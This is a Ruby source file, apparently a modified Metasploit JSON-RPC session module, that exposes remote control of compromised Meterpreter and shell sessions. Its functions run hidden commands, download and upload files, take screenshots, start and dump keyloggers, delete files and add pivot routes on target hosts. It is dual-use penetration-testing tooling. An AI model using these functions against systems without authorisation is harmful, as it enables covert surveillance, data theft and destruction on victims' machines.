# -*- coding: binary -*-
require 'rex'
require 'rex/post/meterpreter/inbound_packet_handler'
require 'rex/ui/text/output/buffer'
require 'fileutils'
require 'pry' # deal with Error 'uninitialized constant Readline'

module Msf
module RPC

class RPC_Session < RPC_Base
  def initialize(*args)
    super
    _notify_session_heartbeat(10)
  end

  # Returns a list of sessions that belong to the framework instance used by the RPC service.
  #
  # @return [Hash] Information about sessions. Each key is the session ID, and each value is a hash
  #                that contains the following:
  #                * 'type' [String] Payload type. Example: meterpreter.
  #                * 'tunnel_local' [String] Tunnel (where the malicious traffic comes from).
  #                * 'tunnel_peer' [String] Tunnel (local).
  #                * 'via_exploit' [String] Name of the exploit used by the session.
  #                * 'desc' [String] Session description.
  #                * 'info' [String] Session info (most likely the target's computer name).
  #                * 'workspace' [String] Name of the workspace.
  #                * 'session_host' [String] Session host.
  #                * 'session_port' [Integer] Session port.
  #                * 'target_host' [String] Target host.
  #                * 'username' [String] Username.
  #                * 'uuid' [String] UUID.
  #                * 'exploit_uuid' [String] Exploit's UUID.
  #                * 'routes' [String] Routes.
  #                * 'platform' [String] Platform.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.list')

  def rpc_list
    res = {}
    self.framework.sessions.each do |sess|
      i,s = sess
      res[s.sid] = {
        'type'         => s.type.to_s,
        'tunnel_local' => s.tunnel_local.to_s,
        'tunnel_peer'  => s.tunnel_peer.to_s,
        'via_exploit'  => s.via_exploit.to_s,
        'via_payload'  => s.via_payload.to_s,
        'desc'         => s.desc.to_s,
        'info'         => s.info.to_s,
        'workspace'    => s.workspace.to_s,
        'session_host' => s.session_host.to_s,
        'session_port' => s.session_port.to_i,
        'target_host'  => s.target_host.to_s,
        'username'     => s.username.to_s,
        'uuid'         => s.uuid.to_s,
        'exploit_uuid' => s.exploit_uuid.to_s,
        'routes'       => s.routes.join(","),
        'arch'         => s.arch.to_s,
        'checkin'      => Time.now.to_i - s.last_checkin.to_i,
      }
      if(s.type.to_s == "meterpreter")
        res[s.sid]['platform'] = s.platform.to_s
      end
    end
    res
  end


  # Stops a session.
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] Unknown session ID.
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #  * 'result' [String] A message that says 'success'.
  def rpc_stop( sid)

    s = self.framework.sessions[sid.to_i]
    if(not s)
      error(500, "Unknown Session ID")
    end
    s.kill rescue nil
    { "result" => "success" }
  end


  # Reads the output of a shell session (such as a command output).
  #
  # @param [Integer] sid Session ID.
  # @param [Integer] ptr Pointer.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  #                              * 500 Session is disconnected.
  # @return [Hash] It contains the following keys:
  #  * 'seq' [String] Sequence.
  #  * 'data' [String] Read data.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.shell_read', 2)
  def rpc_shell_read( sid, ptr=nil)
    s = _valid_session(sid,"shell")
    begin
      res = s.shell_read()
      { "seq" => 0, "data" => res.to_s}
    rescue ::Exception => e
      error(500, "Session Disconnected: #{e.class} #{e}")
    end
  end


  # Writes to a shell session (such as a command). Note that you will to manually add a newline at the
  # enf of your input so the system will process it.
  # You may want to use #rpc_shell_read to retrieve the output.
  #
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  #                              * 500 Session is disconnected.
  # @param [Integer] sid Session ID.
  # @param [String] data The data to write.
  # @return [Hash]
  #  * 'write_count' [Integer] Number of bytes written.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.shell_write', 2, "DATA")
  def rpc_shell_write( sid, data)
    s = _valid_session(sid,"shell")
    begin
      res = s.shell_write(data)
      { "write_count" => res.to_s}
    rescue ::Exception => e
      error(500, "Session Disconnected: #{e.class} #{e}")
    end
  end


  # Upgrades a shell to a meterpreter.
  #
  # @note This uses post/multi/manage/shell_to_meterpreter.
  # @param [Integer] sid Session ID.
  # @param [String] lhost Local host.
  # @param [Integer] lport Local port.
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #  * 'result' [String] A message that says 'success'
  # @example Here's how you would use this from the client:
  #  rpc.call('session.shell_upgrade', 2, payload_lhost, payload_lport)
  def rpc_shell_upgrade( sid, lhost, lport)
    s = _valid_session(sid,"shell")
    s.exploit_datastore['LHOST'] = lhost
    s.exploit_datastore['LPORT'] = lport
    s.execute_script('post/multi/manage/shell_to_meterpreter')
    { "result" => "success" }
  end


  # Reads the output from a meterpreter session (such as a command output).
  #
  # @note Multiple concurrent callers writing and reading the same Meterperter session can lead to
  #  a conflict, where one caller gets the others output and vice versa. Concurrent access to a
  #  Meterpreter session is best handled by post modules.
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] It contains the following key:
  #  * 'data' [String] Data read.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_read', 2)
  def rpc_meterpreter_read( sid)
    s = _valid_session(sid,"meterpreter")

    if not s.user_output.respond_to? :dump_buffer
      s.init_ui(Rex::Ui::Text::Input::Buffer.new, Rex::Ui::Text::Output::Buffer.new)
    end

    data = s.user_output.dump_buffer
    { "data" => data }
  end


  # Reads from a session (such as a command output).
  #
  # @param [Integer] sid Session ID.
  # @param [Integer] ptr Pointer (ignored)
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  #                              * 500 Session is disconnected.
  # @return [Hash] It contains the following key:
  #  * 'seq' [String] Sequence.
  #  * 'data' [String] Read data.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.ring_read', 2)
  def rpc_ring_read(sid, ptr = nil)
    s = _valid_session(sid,"ring")
    begin
      res = s.shell_read()
      { "seq" => 0, "data" => res.to_s }
    rescue ::Exception => e
      error(500, "Session Disconnected: #{e.class} #{e}")
    end
  end


  # Sends an input to a session (such as a command).
  #
  # @param [Integer] sid Session ID.
  # @param [String] data Data to write.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  #                              * 500 Session is disconnected.
  # @return [Hash] It contains the following key:
  #  * 'write_count' [String] Number of bytes written.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.ring_put', 2, "DATA")
  def rpc_ring_put(sid, data)
    s = _valid_session(sid,"ring")
    begin
      res = s.shell_write(data)
      { "write_count" => res.to_s}
    rescue ::Exception => e
      error(500, "Session Disconnected: #{e.class} #{e}")
    end
  end

  # Returns the last sequence (last issued ReadPointer) for a shell session.
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] It contains the following key:
  #  * 'seq' [String] Sequence.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.ring_last', 2)
  def rpc_ring_last(sid)
    s = _valid_session(sid,"ring")
    { "seq" => 0 }
  end


  # Clears a shell session. This may be useful to reclaim memory for idle background sessions.
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash indicating whether the action was successful or not. It contains:
  #  * 'result' [String] Either 'success' or 'failure'.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.ring_clear', 2)
  def rpc_ring_clear(sid)
    { "result" => "success" }
  end


  # Sends an input to a meterpreter prompt.
  # You may want to use #rpc_meterpreter_read to retrieve the output.
  #
  # @note Multiple concurrent callers writing and reading the same Meterperter session can lead to
  #  a conflict, where one caller gets the others output and vice versa. Concurrent access to a
  #  Meterpreter session is best handled by post modules.
  # @param [Integer] sid Session ID.
  # @param [String] data Input to the meterpreter prompt.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash indicating the action was successful or not. It contains the following key:
  #  * 'result' [String] Either 'success' or 'failure'.
  # @see #rpc_meterpreter_run_single
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_write', 2, "sysinfo")
  def rpc_meterpreter_write( sid, data)
    s = _valid_session(sid,"meterpreter")

    if not s.user_output.respond_to? :dump_buffer
      s.init_ui(Rex::Ui::Text::Input::Buffer.new, Rex::Ui::Text::Output::Buffer.new)
    end

    interacting = false
    s.channels.each_value do |ch|
      interacting ||= ch.respond_to?('interacting') && ch.interacting
    end
    if interacting
      s.user_input.put(data + "\n")
    else
      self.framework.threads.spawn("MeterpreterRunSingle", false, s) { |sess| sess.console.run_single(data) }
    end
    { "result" => "success" }
  end

  def rpc_meterpreter_cmdexec(sid, cmd, args=nil, time_out=30)
    s = _valid_session(sid, nil)
    framework.events.on_session_command(s, "#{cmd} #{args}")
    self.framework.threads.spawn("MeterpreterCmdExec", false, s, cmd, args, time_out) { |sess, cmd, args, time_out|
      case sess.type
      when /meterpreter/
        start = Time.now.to_i
        if args.nil? and cmd =~ /[^a-zA-Z0-9\/._-]/
          args = ""
        end

        sess.response_timeout = time_out
        process = sess.sys.process.execute(cmd, args, {'Hidden' => true, 'Channelized' => true, 'Subshell' => true })
        o = ""
        # Wait up to time_out seconds for the first bytes to arrive
        while (d = process.channel.read)
          o << d
          if d == ""
            if Time.now.to_i - start < time_out
              sleep 0.1
            else
              break
            end
          end
        end
        o.chomp! if o

        begin
          process.channel.close
        rescue IOError => e
          # Channel was already closed, but we got the cmd output, so let's soldier on.
        end

        process.close
      when /powershell/
        if args.nil? || args.empty?
          o = sess.shell_command("#{cmd}", time_out)
        else
          o = sess.shell_command("#{cmd} #{args}", time_out)
        end
        o.chomp! if o
      when /shell/
        if args.nil? || args.empty?
          o = sess.shell_command_token("#{cmd}", time_out)
        else
          o = sess.shell_command_token("#{cmd} #{args}", time_out)
        end
        o.chomp! if o
      end
      if not o.nil?
        framework.events.on_session_output(sess, o)
      end
    }
    { "result" => "success" }
  end


  # download file from the target host
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_download_file', 2, "c:\\Users\\Test\\.gitconfig")
  def rpc_meterpreter_download_file(sid, src, dest=nil)
    sess = _valid_session(sid, "meterpreter")

    src = src.gsub(/\\/, '/')
    if not dest
      filepath = "temp/#{File.basename(src)}"
      dest = File.join(Msf::Config.loot_directory, filepath)
      FileUtils.mkdir_p(File.dirname(dest))
    end

    opts = {
      "recursive" => true,
    }
    self.framework.threads.spawn("MeterpreterDownloadFile", false) {
      data = { 'sid': sid, 'filepath': filepath }

      begin
        stat = sess.fs.file.stat(src)
        if (stat.directory?)
          sess.fs.dir.download(dest, src, opts) do |step, src, dst|
            framework.events.on_session_download(sess, src, dest)
          end
        elsif (stat.file?)
          sess.fs.file.download(dest, src, opts) do |step, src, dst|
            framework.events.on_session_download(sess, src, dest)
          end
        end
        data['success'] = true
      rescue ::Exception => e
        data['success'] = false
        data['msg'] = "#{e.class} #{e}"
      end

      data = { 'sid': sid, 'filepath': filepath }
      msg = self.framework.websocket.wrap_websocket_data(:notify, 'on_finished_download', data)
      self.framework.websocket.notify(:notify, msg)
    }

    {"result" => "success", "data" => filepath}
  end


  # akkuman-change
  # Block execution command
  #
  # @note You should start rpc service with json-rpc multi threads, becaues this is a synchronization command to wait
  # for the command to finish returning results.
  # example:
  # thin --rackup msf-json-rpc.ru --address 0.0.0.0 --port 8081 --environment development --tag msf-json-rpc --threaded start
  #
  # @param [Integer] sid Session ID.
  # @param [String] data Input to the meterpreter prompt.
  # @return [Hash] It contains the following key:
  #  * 'data' [String] Data read.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_execute', 2, "sysinfo")
  def rpc_meterpreter_execute(sid, data)
    s = _valid_session(sid, "meterpreter")
    s.console.block_command('edit')
    s.console.block_command('shell')

    s.single_session_mutex.synchronize {
      if not s.user_output.respond_to? :dump_buffer
        s.init_ui(Rex::Ui::Text::Input::Buffer.new, Rex::Ui::Text::Output::Buffer.new)
      end

      interacting = false
      s.channels.each_value do |ch|
        interacting ||= ch.respond_to?('interacting') && ch.interacting
      end
      if interacting
        s.user_input.put(data + "\n")
      else
        s.console.run_single(data)
      end
      
      data = s.user_output.dump_buffer
      { "data" => data }
    }
  end


  # akkuman-change
  # List all process from a meterpreter session
  #
  # @param [Integer] sid Session ID.
  # @return [Hash]
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_ps', 2, "somechar")
  def rpc_meterpreter_ps(sid)
    s = _valid_session(sid, "meterpreter")
    all_processes = s.console.client.sys.process.get_processes

    { "data" => all_processes }
  end

  #  rpc.call('session.meterpreter_edit_file', 3, 'a.txt', 'aaaa')
  def rpc_meterpreter_edit_file(sid, filepath, filecontent)
    s = _valid_session(sid,"meterpreter")

    # Get a temporary file path
    meterp_temp = Tempfile.new('meterp_edit_temp')
    temp_path = meterp_temp.path

    meterp_temp.write(filecontent)
    meterp_temp.rewind

    s.fs.file.upload_file(filepath, temp_path)

    meterp_temp.close
    ::File.delete(temp_path) rescue nil

    { "result" => "success" }
  end

  #  rpc.call('session.meterpreter_screenshot', 3)
  def rpc_meterpreter_screenshot(sid, quality=50)
    s = _valid_session(sid,"meterpreter")

    screenshot_path =  "screenshots/#{s.session_host}/#{Time.now.strftime('%Y%m%d%H%M%S')}.jpeg"
    basedir = File.join(Msf::Config.loot_directory, File.dirname(screenshot_path))
    FileUtils.mkdir_p(basedir)
    uuid = Rex::Text.rand_text_alphanumeric(16).downcase

    self.framework.threads.spawn("MeterpreterScreenshot", false) {
      _data = { 'sid': sid, "path" => screenshot_path, "uuid" => uuid }

      begin
        data = s.console.client.ui.screenshot(quality)
        path = File.join(basedir, File.basename(screenshot_path))
        ::File.open(path, 'wb') do |fd|
          fd.write(data)
        end
        b64 = Base64.strict_encode64(data)
        _data['success'] = true
        _data['data'] = b64
      rescue ::Exception => e
        _data['success'] = false
        _data['msg'] = "#{e.class} #{e}"
      end

      msg = self.framework.websocket.wrap_websocket_data(:notify, 'on_finished_screenshot', _data)
      self.framework.websocket.notify(:notify, msg)
    }

    {"result" => "success", "data" => screenshot_path, "uuid" => uuid}
  end

  #  rpc.call('session.meterpreter_keyscan_start', 3)
  def rpc_meterpreter_keyscan_start(sid, trackwindow=false)
    s = _valid_session(sid,"meterpreter")
    
    s.console.client.ui.keyscan_start(trackwindow)
    { "result" => "success" }
  end

  #  rpc.call('session.meterpreter_keyscan_stop', 3)
  def rpc_meterpreter_keyscan_stop(sid)
    s = _valid_session(sid,"meterpreter")

    s.console.client.ui.keyscan_stop
    { "result" => "success" }
  end

  #  rpc.call('session.meterpreter_keyscan_dump', 3)
  def rpc_meterpreter_keyscan_dump(sid)
    s = _valid_session(sid,"meterpreter")

    data = s.console.client.ui.keyscan_dump
    b64 = Base64.encode64(data)
    { "result" => "success", "data" => b64 }
  end

  # rpc.call('session.meterpreter_route_list')
  def rpc_meterpreter_route_list
    list_route = []
    Rex::Socket::SwitchBoard.each { |route|
      if route.comm.kind_of?(Msf::Session)
        gw = route.comm.sid
      else
        gw = route.comm.name.split(/::/)[-1]
      end
      list_route << {
        :subnet => route.subnet,
        :netmask => route.netmask,
        :session => gw
      } if Rex::Socket.is_ipv4?(route.netmask)
    }
    list_route
  end

  # rpc.call('session.meterpreter_route_add', sid, subnet, netmask)
  def rpc_meterpreter_route_add(sid, subnet, netmask)
    s = _valid_session(sid, "meterpreter")

    if Rex::Socket::SwitchBoard.add_route(subnet, netmask, s)
      return { "result" => "success", "data" => "Route added to subnet #{subnet}/#{netmask}." }
    else
      return { "result" => "failure", "data" => "Could not add route to subnet #{subnet}/#{netmask}." }
    end
  end

  #  rpc.call('session.meterpreter_route_del', sid, subnet, netmask)
  def rpc_meterpreter_route_del(sid, subnet, netmask)
    s = _valid_session(sid, "meterpreter")

    Rex::Socket::SwitchBoard.remove_route(subnet, netmask, s)
    return { "result" => "success" }
  end

  # Detaches from a meterpreter session. Serves the same purpose as [CTRL]+[Z].
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash indicating the action was successful or not. It contains:
  #  * 'result' [String] Either 'success' or 'failure'.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_session_detach', 3)
  def rpc_meterpreter_session_detach(sid)
    s = _valid_session(sid,"meterpreter")
    s.channels.each_value do |ch|
      if(ch.respond_to?('interacting') && ch.interacting)
        ch.detach()
        return { "result" => "success" }
      end
    end
    { "result" => "failure" }
  end


  # Kills a meterpreter session. Serves the same purpose as [CTRL]+[C].
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash indicating the action was successful or not.
  #                It contains the following key:
  #  * 'result' [String] Either 'success' or 'failure'.
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_session_kill', 3)
  def rpc_meterpreter_session_kill(sid)
    s = _valid_session(sid,"meterpreter")
    s.channels.each_value do |ch|
      if(ch.respond_to?('interacting') && ch.interacting)
        ch._close
        return { "result" => "success" }
      end
    end
    { "result" => "failure" }
  end


  # Returns a tab-completed version of your meterpreter prompt input.
  #
  # @param [Integer] sid Session ID.
  # @param [String] line Input.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] The tab-completed result. It contains the following key:
  #  * 'tabs' [String] The tab-completed version of your input.
  # @example Here's how you would use this from the client:
  #  # This returns:
  #  # {"tabs"=>["sysinfo"]}
  #  rpc.call('session.meterpreter_tabs', 3, 'sysin')
  def rpc_meterpreter_tabs(sid, line)
    s = _valid_session(sid,"meterpreter")
    tabs = s.console.tab_complete(line)
    { "tabs" => tabs }
  end


  # Runs a meterpreter command even if interacting with a shell or other channel.
  # You will want to use the #rpc_meterpreter_read to retrieve the output.
  #
  # @param [Integer] sid Session ID.
  # @param [String] data Command.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #  * 'result' [String] 'success'
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_run_single', 3, 'getpid')
  def rpc_meterpreter_run_single( sid, data)
    s = _valid_session(sid,"meterpreter")

    if not s.user_output.respond_to? :dump_buffer
      s.init_ui(Rex::Ui::Text::Input::Buffer.new, Rex::Ui::Text::Output::Buffer.new)
    end

    self.framework.threads.spawn("MeterpreterRunSingle", false, s) { |sess| sess.console.run_single(data) }
    { "result" => "success" }
  end


  # Runs a meterpreter script.
  #
  # @deprecated Metasploit no longer maintains or accepts meterpreter scripts. Please try to use
  #             post modules instead.
  # @see Msf::RPC::RPC_Module#rpc_execute You should use Msf::RPC::RPC_Module#rpc_execute instead.
  # @param [Integer] sid Session ID.
  # @param [String] data Meterpreter script name.
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #  * 'result' [String] 'success'
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_script', 3, 'checkvm')
  def rpc_meterpreter_script( sid, data)
    rpc_meterpreter_run_single( sid, "run #{data}")
  end

  # Changes the Transport of a given Meterpreter Session
  #
  # @param sid [Integer] The Session ID of the `Msf::Session`
  # @option opts [String] :transport The transport protocol to use (e.g. reverse_tcp, reverse_http, bind_tcp etc)
  # @option opts [String] :lhost  The LHOST of the listener to use
  # @option opts [String] :lport The LPORT of the listener to use
  # @option opts [String] :ua The User Agent String to use for reverse_http(s)
  # @option opts [String] :proxy_host The address of the proxy to route transport through
  # @option opts [String] :proxy_port The port the proxy is listening on
  # @option opts [String] :proxy_type The type of proxy to use
  # @option opts [String] :proxy_user The username to authenticate to the proxy with
  # @option opts [String] :proxy_pass The password to authenticate to the proxy with
  # @option opts [String] :comm_timeout Connection timeout in seconds
  # @option opts [String] :session_exp  Session Expiration Timeout
  # @option opts [String] :retry_total Total number of times to retry etsablishing the transport
  # @option opts [String] :retry_wait The number of seconds to wait between retries
  # @option opts [String] :cert  Path to the SSL Cert to use for HTTPS
  # @return [Boolean] whether the transport was changed successfully
  def rpc_meterpreter_transport_change(sid,opts={})
    session = _valid_session(sid,"meterpreter")
    real_opts = {}
    opts.each_pair do |key, value|
      real_opts[key.to_sym] = value
    end
    real_opts[:uuid] = session.payload_uuid
    result = session.core.transport_change(real_opts)
    if result == true
      rpc_stop(sid)
    end
    result
  end


  # Returns the separator used by the meterpreter.
  #
  # @param [Integer] sid Session ID.
  # @raise [Msf::RPC::Exception] An error that could be one of these:
  #                              * 500 Session ID is unknown.
  #                              * 500 Invalid session type.
  # @return [Hash] A hash that contains the separator. It contains the following key:
  #  * 'separator' [String] The separator used by the meterpreter.
  # @example Here's how you would use this from the client:
  #  # This returns:
  #  # {"separator"=>"\\"}
  #  rpc.call('session.meterpreter_directory_separator', 3)
  def rpc_meterpreter_directory_separator(sid)
    s = _valid_session(sid,"meterpreter")

    { "separator" => s.fs.file.separator }
  end


  # Returns all the compatible post modules for this session.
  #
  # @param [Integer] sid Session ID.
  # @return [Hash] Post modules. It contains the following key:
  #  * 'modules' [Array<string>] An array of post module names. Example: ['post/windows/wlan/wlan_profile']
  # @example Here's how you would use this from the client:
  #  rpc.call('session.compatible_modules', 3)
  def rpc_compatible_modules( sid)
    ret = []

    mtype = "post"
    names = self.framework.post.keys.map{ |x| "post/#{x}" }
    names.each do |mname|
      m = _find_module(mtype, mname)
      next if not m.session_compatible?(sid)
      ret << m.fullname
    end
    { "modules" => ret }
  end


  # akkuman-change
  # Upload a local file to target session which in loot dir
  #
  # @param [Integer] sid Session ID.
  # @param [String] src local file path
  # @param [String] dest target session
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #  * 'result' [String] 'success'
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_upload_file', 3, '1.txt', '1.txt')
  def rpc_meterpreter_upload_file(sid, src, dest)
    s = _valid_session(sid, "meterpreter")

    begin
      src = Msf::Config.loot_directory + File::SEPARATOR + src
      stat = ::File.stat(src)
      if (stat.directory?)
        s.fs.dir.upload(dest, src, recursive)
      elsif (stat.file?)
        if s.fs.file.exist?(dest) && s.fs.file.stat(dest).directory?
          s.fs.file.upload(dest, src)
        else
          s.fs.file.upload_file(dest, src)
        end
      end
      { :result => 'success' }
    rescue ::Exception => e
      error(500, "#{e.class} #{e}")
    end
  end

  # get then content of special file
  # 
  # @param [Integer] sid Session ID
  # @param [String] filepath the path of file
  # @return [Hash] A hash indicating the action was successful and the content of file.
  #  * 'result' [String] 'success'
  #  * 'data' [String] the content of file
  # @example Here's how you would use this from the client:
  #  rpc.call('session.meterpreter_cat_file', 3, 'C:\\Users\\Akkuman\\Desktop\\1.txt')
  def rpc_meterpreter_cat_file(sid, filepath)
    s = _valid_session(sid, "meterpreter")

    content = ''
    if (s.fs.file.stat(filepath).directory?)
      return error(500, "#{filepath} is a directory")
    else
      fd = s.fs.file.new(filepath, "rb")
      begin
        until fd.eof?
          content << fd.read
        end
      # EOFError is raised if file is empty, do nothing, just catch
      rescue EOFError
      end
      fd.close
    end
    { :result => 'success', :data => content }
  end


  # akkuman-change
  # list files
  # reference: Console::CommandDispatcher::Stdapi::Fs#cmd_ls
  #
  # @param [Integer] sid Session ID
  # @param [String] path the target host's dir path
  # @return [Hash] a hash contains file list. It contains the following key:
  #   * 'result' [String] 'success'
  #   * 'data' [List] file list
  # @example Here's how you would use this from the client
  #  rpc.call('session.meterpreter_ls', 3, 'C:\\users\XXX\Desktop')
  def rpc_meterpreter_ls(sid, path=nil)
    s = _valid_session(sid,"meterpreter")

    begin
      path = (path or s.fs.dir.getwd)
      sort = 'Name'
      order = :forward
      short = nil
      recursive = nil
      search_term = nil
      path = s.fs.file.expand_path(path) if path =~ /\%(\w*)\%/
      stat = s.fs.file.stat(path)
      dirs = []
      if (path == "/" and s.platform == "windows")
        s.fs.mount.show_mount.each do |d|
          ts = ::Filesize.from("#{d[:total_space]} B").pretty
          fs = ::Filesize.from("#{d[:free_space]} B").pretty
          us = ::Filesize.from("#{d[:total_space]-d[:free_space]} B").pretty
          dir = {
            :name  => d[:name],
            :ftype => d[:type],
            :mode  => "#{fs}/#{ts}",
            :size  => us,
          }
          dirs << dir
        end
      elsif stat.directory?
        s.fs.dir.entries_with_info(path).each do |p|
          ffstat = p['StatBuf']
          fname = p['FileName'] || 'unknown'
          dir = {
            :mode  => ffstat ? ffstat.prettymode : '',
            :size  => ffstat ? ffstat.size       : '',
            :ftype => ffstat ? ffstat.ftype      : '',
            :mtime => ffstat ? ffstat.mtime      : '',
            :atime => ffstat ? ffstat.atime      : '',
            :ctime => ffstat ? ffstat.ctime      : '',
            :name => fname,
          }
          dirs << dir
        end
      else
        dir = {
          :moode => stat ? stat.prettymode : '',
          :size  => stat ? stat.size       : '',
          :ftype => stat ? stat.ftype      : '',
          :mtime => stat ? stat.mtime      : '',
          :name => fname,
        }
        dirs << dir
      end
      { 'result' => 'success', 'data' => { 'pwd' => path, 'dirs' => dirs }}
    rescue ::Exception => e
      error(500, "list file error: #{e.class} #{e}")
    end
  end

  # Delete multiple files or folders
  # 
  # @param [Integer] sid Session ID
  # @param [Hash] paths a hash contains dirs and files which will be deleted
  # 
  # @return [Hash] A hash indicating the action was successful. It contains the following key:
  #   * 'result' [String] 'success'
  # @example Here's how you would use this from the client
  #  rpc.call('session.meterpreter_rm', 3, {"dirs": ["C:\\Users\\Akkuman\\Desktop"], "files": ["C:\\Users\\Akkuman\\Desktop\\1.txt"]})
  def rpc_meterpreter_rm(sid, paths)
    s = _valid_session(sid, "meterpreter")

    dirs, files = paths['dirs'] || [], paths['files'] || []
    path_expand_regex = /\%(\w*)\%/
    # rm file
    # reference: lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb#cmd_rm
    files.each do |file_path|
      file_path = s.fs.file.expand_path(file_path) if file_path =~ path_expand_regex
      s.fs.file.rm(file_path)
    end
    # rmdir
    # reference: lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb#cmd_rmdir
    dirs.each { |dir_path|
      dir_path = s.fs.file.expand_path(dir_path) if dir_path =~ path_expand_regex
      s.fs.dir.rmdir(dir_path)
    }
    { :result => 'success' }
  end


private

  def _find_module(mtype,mname)
    mod = self.framework.modules.create(mname)
    if(not mod)
      error(500, "Invalid Module")
    end

    mod
  end

  def _valid_session(sid,type)

    s = self.framework.sessions[sid.to_i]

    if(not s)
      error(500, "Unknown Session ID #{sid}")
    end

    if type == "ring"
      if not s.respond_to?(:ring)
        error(500, "Session #{s.type} does not support ring operations")
      end
    elsif (type == 'meterpreter' && s.type != type) ||
      (type == 'shell' && s.type == 'meterpreter')
      error(500, "Session is not of type " + type)
    end
    s
  end

  def _notify_session_heartbeat(period=1)
    self.framework.threads.spawn("WSNotifySessionHeartbeat", true) {
      while true
        begin
          data = {}
          self.framework.sessions.each do |sess|
            i,s = sess
            data[s.sid] = { 'sid': s.sid, 'checkin': Time.now.to_i - s.last_checkin.to_i }
          end
          if data
            msg = self.framework.websocket.wrap_websocket_data(:notify, 'on_session_heartbeat', data)
            self.framework.websocket.notify(:notify, msg)
          end
        rescue ::Exception => e
          dlog(e)
        ensure
          sleep(period)
        end
      end
    }
  end

end
end
end

